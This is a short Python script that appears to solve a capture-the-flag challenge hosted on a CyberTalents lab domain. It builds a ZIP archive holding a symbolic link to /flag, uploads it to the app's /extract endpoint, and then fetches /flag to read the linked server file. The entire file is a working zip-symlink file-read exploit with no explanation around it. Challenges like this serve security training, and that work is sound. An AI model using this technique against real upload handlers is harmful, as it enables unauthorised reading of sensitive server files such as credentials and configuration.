import requests
import zipfile
import io
import os
import time

# URL of the application
base_url = "http://wcomekgvd0eu93rqp6v4p0gbx3g10wz0yk6mhw3o-web.cybertalentslabs.com/"

# Try to create a ZIP file with a symlink (this might not work in all environments)
try:
    # Create a symlink to /flag
    if os.path.exists("flag_link"):
        os.remove("flag_link")
    os.symlink("/flag", "flag_link")
    
    # Create a ZIP file with the symlink
    with zipfile.ZipFile("symlink.zip", "w") as zf:
        zf.write("flag_link")
    
    # Upload the ZIP file
    print("Uploading ZIP with symlink...")
    with open("symlink.zip", "rb") as f:
        files = {"zipFile": ("symlink.zip", f)}
        response = requests.post(f"{base_url}/extract", files=files)
        print(f"Upload response: {response.status_code}, {response.text}")
    
    # Clean up
    os.remove("flag_link")
    os.remove("symlink.zip")
except Exception as e:
    print(f"Error creating symlink ZIP: {e}")

# Try to access the flag
print("Trying to access flag...")
flag_response = requests.get(f"{base_url}/flag")
if flag_response.status_code == 200:
    print(f"Flag found: {flag_response.text}")
else:
    print(f"Flag access failed: {flag_response.status_code}") 